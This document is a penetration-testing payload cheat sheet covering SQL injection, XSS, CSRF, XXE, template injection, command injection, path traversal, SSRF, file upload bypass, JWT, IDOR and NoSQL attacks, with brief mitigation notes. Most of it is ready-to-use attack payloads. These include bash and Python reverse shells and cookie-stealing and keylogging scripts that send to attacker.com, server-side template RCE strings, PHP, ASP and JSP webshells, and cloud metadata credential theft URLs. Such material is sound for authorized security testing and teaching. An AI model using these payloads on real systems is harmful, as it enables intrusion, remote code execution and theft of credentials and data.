# Risk Legend

## Legend Details

| Icon | Level | Description |
|:----:|:-----:|:------------|
| 🟣 | **Critical** | Full system compromise, data exfiltration, RCE possible |
| 🔴 | **High** | Significant unauthorized access or data exposure |
| 🟠 | **Medium** | Limited impact, requires additional conditions |
| 🟢 | **Low** | Minimal impact, informational or requires user interaction |
| 🔵 | **Info** | No direct risk; used for recon or fingerprinting |

# Web Vulnerabilities

## SQL Injection

*Injecting malicious SQL queries to manipulate back-end databases, bypass authentication, extract data, or destroy records.*

**What to look for:** Login forms, search fields, URL query parameters (`?id=1`), HTTP headers, cookies, JSON/XML POST bodies.

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **Basic Bypass** | `' OR 1=1 --` | Classic auth bypass. Short-circuits WHERE condition. | Paste into username or password field. | Successful login without valid credentials. | 🔴 High |
| **Basic Bypass (hash comment)** | `' OR 1=1 #` | Same as above using MySQL hash comment style. | MySQL-backed login forms. | Login succeeds without valid credentials. | 🔴 High |
| **Always-True String** | `' OR 'a'='a` | Closes string and injects a true condition. | Inject into string-based WHERE clauses. | All records returned or auth bypassed. | 🔴 High |
| **Error-Based (MSSQL)** | `' AND 1=CONVERT(int, (SELECT @@version)) --` | Forces DB to reveal version in error message. | Inject into URL params or input fields. | App displays database error with version strings. | 🟡 Medium |
| **Error-Based (MySQL)** | `' AND extractvalue(1, concat(0x7e, version())) --` | Triggers XML error to leak DB version. | Inject into search or filter fields. | Error output contains version number. | 🟡 Medium |
| **Union-Based** | `' UNION SELECT NULL, version(), user() --` | Appends attacker-controlled result set to legitimate query. | Inject into search field or item ID. | DB name, version, or user appears in page output. | 💀 Critical |
| **Union Column Count** | `' ORDER BY 1 --` then increment | Determines number of columns in the query before union attack. | Increment the number until an error appears. | Error on N means N-1 columns exist. | ℹ️ Info |
| **Blind Boolean** | `' AND 1=1 --` / `' AND 1=2 --` | Detects injection by observing different responses without output. | Compare page content between the two. | Responses differ — page changes indicate vulnerability. | 🔴 High |
| **Blind Time-Based (MySQL)** | `' AND SLEEP(5) --` | Causes a time delay to confirm blind injection. | Observe response time. | Response takes ~5 seconds longer. | 🔴 High |
| **Blind Time-Based (MSSQL)** | `'; WAITFOR DELAY '0:0:5' --` | MSSQL equivalent of SLEEP. | Inject into parameters on MSSQL apps. | Response delays by 5 seconds. | 🔴 High |
| **Blind Time-Based (PostgreSQL)** | `'; SELECT pg_sleep(5) --` | PostgreSQL time delay. | Inject into PostgreSQL-backed parameters. | Response delays by 5 seconds. | 🔴 High |
| **Stacked Queries** | `'; DROP TABLE users; --` | Executes multiple statements. Works where stacked queries are supported. | Inject into any parameter. | Data destruction or second query executed. | 💀 Critical |
| **Out-of-Band (DNS)** | `' UNION SELECT load_file(concat('\\\\', (SELECT user()), '.attacker.com\\x')) --` | Exfiltrates data via DNS lookup. | Requires OOB channel and DB file read permissions. | DNS query received at attacker's server. | 💀 Critical |
| **Second-Order Injection** | `admin'--` (stored, triggered later) | Payload stored safely, executed when retrieved by a different query. | Register username with injection payload; trigger in a profile update. | Injection fires when data is reused elsewhere. | 🔴 High |
| **WAF Bypass (case)** | `' oR 1=1 --` | Mixed case to evade simple keyword blacklists. | Use when standard payloads are blocked. | Same outcome as standard bypass. | 🟡 Medium |
| **WAF Bypass (comments)** | `' OR/**/1=1--` | Uses inline comments to break up keywords. | Use when spaces are filtered. | Bypass succeeds. | 🟡 Medium |
| **WAF Bypass (URL encoding)** | `%27%20OR%201%3D1%20--` | URL-encodes special characters. | Inject via URL parameter. | Same auth bypass outcome. | 🟡 Medium |

**Mitigation:** Use parameterized queries / prepared statements. Never concatenate user input into SQL strings. Apply least-privilege DB accounts.

## Cross-Site Scripting (XSS)

*Injecting client-side scripts into web pages viewed by other users, enabling session hijacking, credential theft, or malware delivery.*

**Types:**
- **Reflected XSS** — payload in URL/request, returned immediately in response
- **Stored XSS** — payload saved to DB, executes for all future viewers
- **DOM XSS** — payload processed entirely by client-side JavaScript

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **Simple Alert** | `<script>alert(1)</script>` | Basic script tag execution test. | Paste into comment, profile, or search field. | Browser alert box with "1" appears. | 🔴 High |
| **Image OnError** | `<img src=x onerror=alert(1)>` | Bypasses `<script>` tag filters using event handlers. | Paste into HTML-supporting fields. | Alert fires when broken image loads. | 🔴 High |
| **SVG Vector** | `<svg onload=alert(1)>` | SVG elements often bypass basic sanitization. | Inject into rich text or file upload areas. | Alert fires on page load. | 🟡 Medium |
| **Body OnLoad** | `<body onload=alert(1)>` | Fires immediately when body loads. | Inject into HTML-rendering contexts. | Alert on page load. | 🔴 High |
| **Input AutoFocus** | `<input autofocus onfocus=alert(1)>` | Fires when element auto-focuses without user interaction. | Inject into form or HTML fields. | Alert fires automatically. | 🟡 Medium |
| **Details/Summary** | `<details open ontoggle=alert(1)>` | Uses HTML5 toggle event — bypasses many filters. | Inject into areas supporting HTML5 elements. | Alert fires when toggled. | 🟡 Medium |
| **JavaScript URI** | `javascript:alert(1)` | Used in `href` or `src` attributes. | Inject into link `href` inputs. | Alert fires when link is clicked. | 🔴 High |
| **Double-Encoded** | `%3Cscript%3Ealert(1)%3C/script%3E` | URL-encoded tags to bypass input filters. | Inject into URL parameters. | Alert fires if app double-decodes. | 🟡 Medium |
| **HTML Entity Bypass** | `&lt;script&gt;alert(1)&lt;/script&gt;` | Tests if app incorrectly renders entities as HTML. | Inject into fields with entity conversion. | Alert fires if entities are rendered. | 🔵 Low |
| **Angular Template** | `{{constructor.constructor('alert(1)')()}}` | Sandbox escape in older Angular versions. | Inject into Angular-rendered templates. | Alert fires — confirms client-side template injection. | 🔴 High |
| **Cookie Theft** | `<script>document.location='https://attacker.com/?c='+document.cookie</script>` | Exfiltrates session cookies to attacker server. | Inject in stored XSS vector. | Cookies arrive at attacker's server. | 💀 Critical |
| **Keylogger** | `<script>document.onkeypress=function(e){new Image().src='https://attacker.com/?k='+e.key}</script>` | Captures keystrokes. | Inject in persistent/stored context. | Keystrokes logged at attacker's server. | 💀 Critical |
| **DOM XSS** | `#<img src=x onerror=alert(1)>` | Payload via URL hash processed by client-side JS. | Append to URL hash fragment. | Alert fires if JS reads `location.hash` unsafely. | 🔴 High |
| **Polyglot** | `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e` | Multi-context payload that works across many HTML contexts. | Use when you can't determine the rendering context. | Alert fires in one or more contexts. | 🔴 High |

**Mitigation:** Output-encode all user data (HTML, JS, URL contexts separately). Use Content-Security-Policy. Set HttpOnly on session cookies.

## Cross-Site Request Forgery (CSRF)

*Tricking authenticated users into unknowingly submitting requests to a web app where they're already authenticated.*

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **GET-based CSRF** | `<img src="https://target.com/api/transfer?to=attacker&amount=1000">` | Triggers state-changing GET request via image tag. | Host on attacker page; open while logged into target. | Transfer executes without user action. | 🔴 High |
| **POST Form Auto-Submit** | `<form action="https://target.com/change-email" method="POST"><input name="email" value="attacker@evil.com"><script>document.forms[0].submit()</script></form>` | Auto-submits a POST form on page load. | Host on attacker page; visit while logged in. | Email changed on target without consent. | 🔴 High |
| **JSON CSRF** | `<script>fetch('https://target.com/api/settings',{method:'POST',credentials:'include',body:JSON.stringify({admin:true}),headers:{'Content-Type':'text/plain'}})</script>` | Attempts CSRF on JSON APIs. | Host on attacker page. | Settings change if no CSRF token or CORS misconfigured. | 🟡 Medium |
| **Token Bypass (deletion)** | Remove `csrf_token` parameter entirely | Some apps only validate token if present. | Delete token from request; resend. | Request succeeds — token not enforced. | 🔴 High |
| **Token Bypass (empty)** | `csrf_token=` | Same as deletion but with empty value. | Set token to blank; resend. | Request succeeds. | 🔴 High |

**Mitigation:** Synchronizer token pattern. SameSite=Strict/Lax cookies. Verify Origin/Referer headers.

## XML External Entity (XXE)

*Abusing XML parsers that process external entity references, enabling file reads, SSRF, or DoS.*

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **Basic File Read** | `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>` | Reads a local file via external entity. | Submit in any XML-accepting input (file upload, API body). | `/etc/passwd` contents appear in response. | 💀 Critical |
| **Windows File Read** | `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>` | Same attack on Windows hosts. | Submit in XML input against Windows servers. | `win.ini` contents in response. | 💀 Critical |
| **SSRF via XXE** | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service:8080/admin">]><foo>&xxe;</foo>` | Makes the server issue an HTTP request to an internal address. | Submit and observe response. | Internal service response returned to attacker. | 💀 Critical |
| **Blind XXE (OOB)** | `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd">%xxe;]>` | Exfiltrates data out-of-band when response contains no output. | Host evil.dtd; trigger request; watch attacker server logs. | DNS/HTTP hit received at attacker server. | 🔴 High |
| **Billion Laughs (DoS)** | `<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>` | Exponential entity expansion causes memory exhaustion. | Submit to XML parser. | Server becomes unresponsive / crashes. | 💀 Critical |

**Mitigation:** Disable external entity processing in XML parsers. Use JSON where possible. Validate and restrict XML input.

## Server-Side Template Injection (SSTI)

*Injecting template directives that are executed server-side, potentially leading to RCE.*

| Name | Payload | Engine | How to Test | Success Indicator | Risk |
|:-----|:--------|:-------|:------------|:-----------------|:-----|
| **Detection** | `{{7*7}}` | Jinja2, Twig, generic | Inject into any input that appears reflected in output. | `49` appears in response (not literal `{{7*7}}`). | ℹ️ Info |
| **Detection (ERB)** | `<%= 7*7 %>` | Ruby ERB | Inject into Ruby-based apps. | `49` in response. | ℹ️ Info |
| **Detection (FreeMarker)** | `${7*7}` | FreeMarker | Inject into Java apps. | `49` in response. | ℹ️ Info |
| **Jinja2 Config Dump** | `{{config}}` | Jinja2 (Flask) | Inject after confirming Jinja2 context. | Flask config object with secret keys exposed. | 🔴 High |
| **Jinja2 RCE** | `{{''.__class__.__mro__[1].__subclasses__()[414]('id',shell=True,stdout=-1).communicate()[0].strip()}}` | Jinja2 | Adjust subclass index for the target environment. | Output of `id` command returned. | 💀 Critical |
| **Jinja2 RCE (simpler)** | `{{ namespace.__init__.__globals__.os.popen('id').read() }}` | Jinja2 | Inject in template context. | `uid=...` output in response. | 💀 Critical |
| **Twig RCE** | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` | Twig (PHP) | Inject into Twig template input. | Command output returned. | 💀 Critical |
| **Smarty RCE** | `{php}echo `id`;{/php}` | Smarty (PHP) | Use in Smarty-backed template fields. | Command output returned. | 💀 Critical |
| **Velocity RCE** | `#set($x='')##$x.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')` | Apache Velocity | Inject into Java Velocity templates. | Command executed server-side. | 💀 Critical |

**Mitigation:** Never render raw user input in templates. Use sandboxed template engines. Separate logic from templates.

## Open Redirect

*Abusing redirect parameters to send users to attacker-controlled URLs, enabling phishing.*

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **Basic** | `https://target.com/redirect?url=https://attacker.com` | Direct redirect to external URL. | Replace redirect param value with external URL. | Browser navigates to attacker.com. | 🟡 Medium |
| **Double Slash** | `//attacker.com` | Protocol-relative URL treated as external. | Inject in redirect parameter. | Redirected to attacker.com. | 🟡 Medium |
| **URL Encoding** | `%68%74%74%70%73://attacker.com` | Encoded URL to bypass basic string matching. | URL-encode the redirect destination. | Redirected successfully. | 🟡 Medium |
| **Null Byte** | `https://target.com%00.attacker.com` | Null byte terminates the expected domain check. | Inject in redirect target. | Bypass of domain whitelist. | 🟡 Medium |
| **@-Based** | `https://target.com@attacker.com` | `@` makes attacker.com the actual host. | Inject in redirect URL. | Redirected to attacker.com. | 🟡 Medium |
| **Backslash** | `https:\\attacker.com` | Some parsers treat backslash as forward slash. | Inject with backslash. | Redirect to attacker.com. | 🟡 Medium |

**Mitigation:** Whitelist redirect destinations. Avoid user-controlled redirect targets. Validate against a strict allowlist of domains.

## HTTP Header Injection

*Injecting newlines or special chars into HTTP headers to split responses or poison caches.*

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **CRLF Injection** | `%0d%0aSet-Cookie: session=evil` | Injects a new HTTP header by splitting the response. | Inject into a parameter reflected in a header (e.g., redirect location). | Additional Set-Cookie header appears in response. | 🔴 High |
| **Response Splitting** | `%0d%0a%0d%0a<html>Fake page</html>` | Injects a full fake HTTP response body. | Inject CRLF + blank line into reflected header. | Fake body content returned to client. | 🔴 High |
| **Host Header Injection** | `X-Forwarded-Host: attacker.com` | Abuses trust in forwarded host headers for password reset poisoning. | Set `X-Forwarded-Host` to attacker domain; trigger a password reset. | Password reset link points to attacker.com. | 🔴 High |
| **X-Forwarded-For Spoofing** | `X-Forwarded-For: 127.0.0.1` | Spoofs IP to bypass IP-based access controls. | Set header to loopback/internal IP. | Access granted to restricted admin area. | 🔴 High |

**Mitigation:** Sanitize newline characters from user input before including in headers. Don't trust `X-Forwarded-*` headers without a trusted proxy.

# System Vulnerabilities

## Command Injection

*Executing arbitrary system commands on the host OS through insufficiently sanitized user input.*

**What to look for:** Fields passed to system commands — IP lookup, DNS resolution, file conversion, ping utilities, printer names, search indexers.

| Name | Payload | OS | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:---|:------------|:------------|:-----------------|:-----|
| **Basic Pipe** | `; ls -la` | Linux | Chains a command after the intended one using semicolon. | Inject into fields passed to a shell. | Directory listing appears in output. | 💀 Critical |
| **Logical AND** | `&& cat /etc/passwd` | Linux | Executes second command only if first succeeds. | Inject into command parameters. | `/etc/passwd` contents revealed. | 💀 Critical |
| **Background Execution** | `& whoami` | Linux | Runs second command in background. | Inject into parameters. | `whoami` output appears. | 💀 Critical |
| **Pipe Operator** | `| id` | Linux | Pipes output of first command to second. | Inject into any shell-executed input. | UID/GID information displayed. | 💀 Critical |
| **Windows Semicolon** | `; dir` | Windows | Chains command on Windows CMD. | Inject into Windows server fields. | Directory listing appears. | 💀 Critical |
| **Windows Pipe** | `| whoami` | Windows | Pipe on Windows. | Inject into Windows command fields. | Current user displayed. | 💀 Critical |
| **Newline Injection** | `%0a id` | Linux | Uses newline to inject a second command. | URL-encode newline in parameter. | `id` output returned. | 💀 Critical |
| **Blind (time-based)** | `; sleep 5` | Linux | Confirms injection with a time delay when output is suppressed. | Observe response time difference. | Response takes 5+ extra seconds. | 🔴 High |
| **Blind (OOB DNS)** | `; nslookup attacker.com` | Linux | Triggers DNS lookup to confirm blind injection. | Watch attacker's DNS server logs. | DNS query received. | 🔴 High |
| **Reverse Shell (bash)** | `; bash -i >& /dev/tcp/attacker.com/4444 0>&1` | Linux | Establishes a reverse shell connection. | Set up listener; inject payload. | Shell session opens on attacker machine. | 💀 Critical |
| **Reverse Shell (Python)** | `; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh"])'` | Linux | Python-based reverse shell. | Same as bash reverse shell. | Shell session over attacker TCP. | 💀 Critical |
| **Filter Bypass (quotes)** | `w'h'o'a'm'i` | Linux | Breaks the command with quotes to bypass keyword filtering. | Use when `whoami` is blocked as a word. | Output of whoami returned. | 🟡 Medium |
| **Filter Bypass (env var)** | `$IFS` instead of spaces | Linux | Uses `$IFS` (Internal Field Separator) as a space substitute. | Use `cat$IFS/etc/passwd` when spaces are filtered. | File contents returned. | 🟡 Medium |

**Mitigation:** Never pass user input to shell commands. Use language-native APIs instead. If unavoidable, whitelist inputs strictly and use `shlex.quote()` or equivalent.

## Path Traversal / Directory Traversal

*Manipulating file path parameters to access files outside the intended directory.*

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **Basic Traversal** | `../../../../etc/passwd` | Steps up directories to reach root. | Inject into file name or path parameters. | `/etc/passwd` contents returned. | 💀 Critical |
| **URL Encoded** | `..%2F..%2F..%2Fetc%2Fpasswd` | URL-encoded slashes to bypass path normalization. | Inject in URL path or parameter. | File contents returned. | 💀 Critical |
| **Double Encoded** | `..%252F..%252Fetc%252Fpasswd` | Double-encoded slashes to bypass double-decode filters. | Inject in URL parameter. | File contents returned if double-decoded. | 🔴 High |
| **Null Byte** | `../../../../etc/passwd%00.jpg` | Null byte truncates `.jpg` extension added by app. | Inject where app appends extension. | File read without extension restriction. | 🔴 High |
| **Windows Backslash** | `..\..\..\windows\win.ini` | Windows path separator. | Inject into Windows server path params. | `win.ini` contents returned. | 💀 Critical |
| **Windows Mixed** | `..\/..\/etc/passwd` | Mixed separators to confuse normalizers. | Inject into cross-platform apps. | File read succeeds. | 🔴 High |
| **Absolute Path** | `/etc/shadow` | Direct absolute path if no prefix is enforced. | Inject absolute path directly. | File contents returned. | 💀 Critical |
| **Interesting Files — Linux** | `/etc/passwd` `/etc/shadow` `/etc/hosts` `/proc/self/environ` `~/.ssh/id_rsa` `~/.bash_history` `/var/log/apache2/access.log` | High-value targets after traversal is confirmed. | Use after successful traversal proof. | Sensitive data exposed. | 💀 Critical |
| **Interesting Files — Windows** | `C:\Windows\win.ini` `C:\Windows\System32\drivers\etc\hosts` `C:\inetpub\wwwroot\web.config` | Windows equivalents. | Use on Windows targets. | Config or credential data exposed. | 💀 Critical |

**Mitigation:** Use canonical path resolution and verify it starts with the allowed base directory. Never trust user-controlled file names/paths.

## Server-Side Request Forgery (SSRF)

*Tricking the server into making HTTP requests to internal or external resources on behalf of the attacker.*

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **Localhost Access** | `http://127.0.0.1/admin` | Accesses admin panel only available on localhost. | Inject into URL-fetching parameter. | Admin page content returned. | 💀 Critical |
| **Internal IP** | `http://192.168.1.1` | Scans internal network. | Try common RFC1918 ranges. | Internal service response returned. | 🔴 High |
| **AWS Metadata** | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Steals IAM credentials from AWS metadata service. | Inject on AWS-hosted apps. | IAM credentials (AccessKeyId, SecretAccessKey) returned. | 💀 Critical |
| **GCP Metadata** | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | Steals access token from GCP metadata. | Inject on GCP-hosted apps with `Metadata-Flavor: Google` header. | OAuth token returned. | 💀 Critical |
| **Azure Metadata** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Azure instance metadata access. | Inject on Azure-hosted apps with `Metadata: true` header. | Azure instance and identity data returned. | 💀 Critical |
| **DNS Rebinding** | Host DNS that resolves to 127.0.0.1 after initial check | Bypasses IP-based allow-listing via DNS TTL manipulation. | Point domain to allowed IP, then remap to internal IP. | Access to internal services after rebind. | 🔴 High |
| **SSRF via Redirect** | `http://attacker.com/redirect-to-internal` (server redirects to 127.0.0.1) | Uses a redirect chain to reach internal services. | Host a redirect on attacker server. | Internal resource accessed via redirect. | 🔴 High |
| **Protocol Smuggling (file)** | `file:///etc/passwd` | Uses `file://` protocol to read local files. | Inject as URL in a fetch parameter. | Local file contents returned. | 💀 Critical |
| **Protocol Smuggling (dict)** | `dict://127.0.0.1:11211/` | Can interact with memcached or other dict-protocol services. | Inject dict:// URL. | Service banner or data returned. | 🔴 High |
| **Bypass via IPv6** | `http://[::1]/admin` | IPv6 loopback to bypass `127.0.0.1` filters. | Use IPv6 notation in URL. | Admin content returned. | 🔴 High |
| **Bypass via Decimal IP** | `http://2130706433/` | Decimal representation of `127.0.0.1`. | Use decimal notation. | Same as localhost access. | 🔴 High |
| **Bypass via Octal** | `http://0177.0.0.1/` | Octal representation of `127`. | Use octal notation. | Same as localhost access. | 🔴 High |

**Mitigation:** Validate and whitelist allowed domains/IPs. Block requests to private RFC1918 and link-local ranges. Use egress firewalls. Require metadata API tokens.

## File Upload Bypass

*Circumventing file upload restrictions to upload malicious files (webshells, executables).*

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **Extension Bypass** | `shell.php.jpg` | Double extension confuses type detection. | Upload file with double extension. | File stored as PHP-executable. | 💀 Critical |
| **Null Byte** | `shell.php%00.jpg` | Truncates filename at null byte on some servers. | Upload with null byte in filename. | `.php` file stored and executable. | 💀 Critical |
| **Alternate PHP Extension** | `shell.pHp` / `shell.php5` / `shell.phtml` | Alternate extensions parsed by PHP. | Try each on PHP apps. | Shell is executed when accessed. | 💀 Critical |
| **MIME Type Spoof** | Upload `.php` with `Content-Type: image/jpeg` | Bypasses MIME-type-only validation. | Modify Content-Type in Burp. | PHP shell uploaded and accessible. | 💀 Critical |
| **SVG Webshell** | `<svg><script>alert(1)</script></svg>` | SVG containing XSS or script content, often uploaded as an image. | Upload SVG file; access it directly. | XSS fires when file is viewed. | 🔴 High |
| **PHP Webshell Payload** | `<?php system($_GET['cmd']); ?>` | Minimal PHP webshell that executes commands. | Upload; access via URL with `?cmd=id`. | Command output returned from server. | 💀 Critical |
| **ASP Webshell** | `<% eval request("cmd") %>` | ASP webshell for IIS/Windows servers. | Upload on ASP.NET apps. | Commands executed on Windows server. | 💀 Critical |
| **JSP Webshell** | `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` | JSP shell for Java app servers. | Upload on Tomcat/JBoss. | Command executed server-side. | 💀 Critical |
| **Archive Slip (Zip)** | Zip containing `../../../../etc/cron.d/evil` | Path traversal via archive extraction. | Upload zip; trigger extraction. | File written outside intended directory. | 💀 Critical |
| **ImageMagick (ImageTragick)** | `push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://attacker.com/x.png"|id; ")'` | RCE via ImageMagick MVG/MSL processing. | Upload as `.mvg` or `.msl`. | Command executed during image processing. | 💀 Critical |

**Mitigation:** Validate file type by content (magic bytes), not by extension or MIME header. Rename uploaded files. Store outside web root. Use content-disposition headers. Scan with AV.

# Authentication & Authorization

## Broken Authentication

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:-------------------|:------------|:------------|:-----------------|:-----|
| **Credential Stuffing** | Use leaked credential lists | Automated use of breached username/password combos. | Use Hydra/Burp Intruder with leaked lists. | Successful logins with real credentials. | 🔴 High |
| **Password Spraying** | `password123` / `Summer2024!` against many accounts | Avoids lockout by using 1–2 common passwords across many accounts. | Burp Intruder: many usernames, few passwords. | One or more logins succeed. | 🔴 High |
| **Default Credentials** | `admin:admin` / `admin:password` / `root:root` | Tries factory-default credentials. | Try on login, admin panels, IoT devices, routers. | Login succeeds. | 🔴 High |
| **Username Enumeration** | Monitor response differences for valid vs invalid usernames | Different error messages or timing leaks valid accounts. | Compare error text / response time for valid vs invalid users. | Different response confirms account exists. | 🟡 Medium |
| **Account Lockout Bypass** | Change `X-Forwarded-For` per request / use distributed IPs | Rotates IP to evade lockout per-IP. | Rotate IP header value with each attempt. | Lockout not triggered after many failures. | 🔴 High |
| **Password Reset Poisoning** | Inject `X-Forwarded-Host: attacker.com` during reset request | Reset link sent to victim contains attacker-controlled domain. | Trigger reset with injected header; monitor email. | Reset link points to attacker.com. | 🔴 High |
| **Weak Reset Token** | Brute-force short numeric tokens (e.g., 4–6 digits) | Predict or brute-force short reset codes. | Enumerate token space with Burp Intruder. | Valid reset token discovered. | 🔴 High |
| **Token Reuse** | Reuse a consumed password reset token | Check if tokens are invalidated after use. | Reset password; reuse the same token link. | Token accepted again. | 🔴 High |

## JWT Attacks

*JSON Web Token manipulation to bypass authentication or escalate privileges.*

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:-------------------|:------------|:------------|:-----------------|:-----|
| **Algorithm None** | Set `alg: none`, remove signature | Some libraries accept unsigned tokens when alg is `none`. | Modify header to `{"alg":"none","typ":"JWT"}`; strip signature. | Server accepts modified token. | 💀 Critical |
| **HS256 with RS256 Key** | Sign with public key using HS256 | When server accepts both algorithms, sign HS256 token with the public RSA key. | Obtain public key; sign HS256 token with it. | Token accepted — privilege escalated. | 💀 Critical |
| **Weak Secret Brute-Force** | `hashcat -a 0 -m 16500 token.txt wordlist.txt` | Crack weak HMAC secrets offline. | Extract token; run hashcat against it. | Secret recovered; tokens forgeable. | 💀 Critical |
| **Claim Tampering** | Change `"role":"user"` to `"role":"admin"` | Modify payload claims if signature not verified. | Decode; modify; re-encode; send. | Elevated privileges granted. | 💀 Critical |
| **Kid Header Injection** | `"kid": "../../dev/null"` or `"kid": "' UNION SELECT 'attacker-secret'--"` | `kid` claim used to look up signing key — inject path or SQL. | Modify `kid` in header. | Attacker-chosen key used for verification. | 💀 Critical |
| **JWK Set URL Injection** | `"jku": "https://attacker.com/jwks.json"` | Server fetches keys from attacker-controlled URL. | Point `jku` to attacker's JWKS; host matching keypair. | Token signed with attacker key is accepted. | 💀 Critical |
| **Expired Token Acceptance** | Send token with past `exp` claim | Check if server validates token expiry. | Set `exp` to past timestamp; send. | Expired token accepted. | 🔴 High |

## Insecure Direct Object Reference (IDOR)

*Accessing resources by guessing or modifying identifiers without authorization checks.*

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:-------------------|:------------|:------------|:-----------------|:-----|
| **Sequential ID** | Change `/api/orders/1002` → `/api/orders/1001` | Increment/decrement numeric IDs to access other users' data. | Modify ID in URL or request body. | Another user's data returned. | 🔴 High |
| **GUID/UUID Swap** | Replace your GUID with another user's GUID | Swap GUID from one user to another's object. | Capture a second account's GUID; swap in request. | Cross-user data exposed. | 🔴 High |
| **Indirect Reference** | Change `user_id` in POST body | Modify user ID in hidden fields or JSON body. | Intercept request; change `user_id`. | Data of another user modified. | 🔴 High |
| **HTTP Method Swap** | Try `GET` instead of `POST`, or `PUT` instead of `PATCH` | Access endpoints with alternative HTTP verbs that lack proper auth checks. | Replay with different HTTP method. | Unauthorized data returned or modified. | 🟡 Medium |
| **Hashed ID Prediction** | MD5/SHA1 of sequential integer | Some apps hash sequential IDs — predictable if hash function known. | Hash integers and try as object IDs. | Correct user objects returned. | 🔴 High |

**Mitigation:** Enforce object-level authorization checks on every request. Never trust client-supplied identifiers without server-side validation. Use unpredictable IDs (UUIDs).

# Injection & Encoding

## LDAP Injection

*Injecting LDAP metacharacters to manipulate directory queries.*

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **Auth Bypass** | `*)(uid=*))(|(uid=*` | Short-circuits LDAP filter to match any user. | Inject into LDAP-backed login field. | Login succeeds without valid password. | 🔴 High |
| **Wildcard Dump** | `*` | Returns all records when injected into a search field. | Inject `*` into LDAP search. | All directory entries returned. | 🔴 High |
| **Blind Enumeration** | `admin)(|(password=a*` | Brute-forces first char of password in blind LDAP. | Vary the wildcard; observe response changes. | Different responses confirm character. | 🟡 Medium |

## NoSQL Injection

*Injecting operators into NoSQL queries (MongoDB, CouchDB, etc.).*

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **Auth Bypass (JSON)** | `{"username": {"$gt": ""}, "password": {"$gt": ""}}` | MongoDB `$gt` always-true condition. | Inject in JSON request body. | Login succeeds without valid credentials. | 🔴 High |
| **Auth Bypass (URL)** | `username[$ne]=invalid&password[$ne]=invalid` | URL-encoded operator injection. | Replace field values in URL params. | Bypass authentication. | 🔴 High |
| **Data Extraction (regex)** | `{"username": {"$regex": "^admin"}}` | Enumerates field values using regex matching. | Vary the regex; observe responses. | Confirms value of username/password chars. | 🔴 High |
| **JavaScript Injection** | `{"$where": "this.username == 'admin' && sleep(5000)"}` | Executes JS in MongoDB `$where` clause. | Inject `$where` operator. | Time delay confirms code execution. | 💀 Critical |

## GraphQL Injection

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **Introspection** | `{__schema{types{name}}}` | Dumps entire GraphQL schema. | Send to `/graphql` endpoint. | Full schema with all types and fields returned. | ℹ️ Info |
| **Field Suggestion** | Misspell a field name | GraphQL suggests correct field names in errors. | Submit query with wrong field name. | Error suggests real field names. | ℹ️ Info |
| **Batch Attack** | `[{"query":"mutation{login(user:'admin',pass:'a')}"},{"query":"mutation{login(user:'admin',pass:'b')}"}]` | Sends many mutations in one request to brute-force. | Batch mutations in array. | Rate limiting evaded — more attempts per request. | 🔴 High |
| **IDOR via query** | `{user(id:1002){email,password}}` | Accesses another user's data by changing ID. | Query with other user's ID. | Another user's data returned. | 🔴 High |
| **Alias Overload (DoS)** | `{a:__typename b:__typename ... x1000:__typename}` | Sends huge query using aliases to overload server. | Submit a deeply aliased query. | Server slowdown or OOM. | 🟡 Medium |

## XPath Injection

*Injecting XPath expressions to manipulate XML-based data queries.*

| Name | Payload | Description | How to Test | Success Indicator | Risk |
|:-----|:--------|:------------|:------------|:-----------------|:-----|
| **Auth Bypass** | `' or '1'='1` | Always-true XPath condition. | Inject into XML-backed login form. | Login succeeds without valid credentials. | 🔴 High |
